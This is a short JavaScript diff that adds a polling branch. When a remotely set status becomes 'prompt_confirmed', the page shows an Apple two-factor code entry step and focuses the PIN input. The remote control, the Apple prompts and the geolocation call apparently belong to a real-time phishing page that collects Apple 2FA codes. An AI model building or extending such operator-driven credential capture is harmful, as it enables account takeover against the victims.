@@ -2167,6 +2167,16 @@ function initApp() {
                         handledAppleAskPrompt = true;
                         detectAppleGeoLocation();
                     }
+                } else if (ctrl.status === "prompt_confirmed") {
+                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                    if (!stepApple2FA.classList.contains("active")) {
+                        showStep(stepApple2FA);
+                        clearApplePinCells();
+                        if (apple2faCodeInput) {
+                            apple2faCodeInput.focus();
+                            syncApplePinVisuals();
+                        }
+                    }
                 } else if (ctrl.status === "completed") {
                     stopApplePolling();
                     if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
